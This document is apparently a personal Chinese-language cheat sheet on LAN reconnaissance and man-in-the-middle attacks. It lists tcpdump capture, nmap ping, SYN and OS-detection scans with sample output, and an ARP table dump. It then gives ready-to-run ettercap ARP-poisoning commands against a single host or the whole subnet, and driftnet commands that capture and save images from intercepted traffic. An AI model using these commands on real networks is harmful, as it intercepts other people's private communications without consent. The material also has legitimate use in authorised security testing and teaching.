ifconfig

# 局域网抓包
tcpdump -vv -i wlp8s0 > 0720.txt


# 查看局域网主机ip

- 进行ping扫描，打印出对扫描做出响应的主机　
搜索
nmap -sP 192.168.1.0/24　　

Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-20 20:46 CST
Nmap scan report for localhost (192.168.1.1)
Nmap scan report for localhost (192.168.1.100)
Nmap scan report for localhost (192.168.1.103)
Nmap scan report for localhost (192.168.1.105)
Nmap scan report for localhost (192.168.1.107)
Nmap scan report for localhost (192.168.1.123)
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.91 seconds

半开放扫描
sudo nmap -sS 192.168.1.0/24

- 扫描之后查看arp缓存表获取局域网主机IP地址
cat /proc/net/arp

IP address       HW type     Flags       HW address            Mask     Device
192.168.1.112    0x1         0x2         a0:18:28:18:0d:2a     *        wlp8s0
192.168.1.1      0x1         0x2         b0:95:8e:c9:85:5c     *        wlp8s0
192.168.1.104    0x1         0x2         a0:86:c6:9f:35:25     *        wlp8s0
192.168.1.107    0x1         0x2         e0:b5:2d:00:41:6b     *        wlp8s0
192.168.1.100    0x1         0x2         74:ac:5f:89:34:90     *        wlp8s0
192.168.1.105    0x1         0x2         2c:56:dc:3b:da:8b     *        wlp8s0
192.168.1.103    0x1         0x2         20:68:9d:94:13:8f     *        wlp8s0

- 检测操作系统
sudo nmap -O 192.168.1.1



# 中间人

sudo apt install ettercap-text-only
sudo apt install driftnet
sudo ettercap -Tqi wlp8s0 -M arp:remote /192.168.1.107// /192.168.1.1//
sudo ettercap -Tqi wlp8s0 -M arp:remote /// /192.168.1.1//
sudo driftnet -i wlp8s0
sudo driftnet -i wlp8s0 -d dir_name -am max-num -s # 保存图片到文件夹




sudo apt install ettercap-graphical
sudo ettercap -G
https://blog.csdn.net/zc19930620/article/details/61642372

ettercap -Tzq
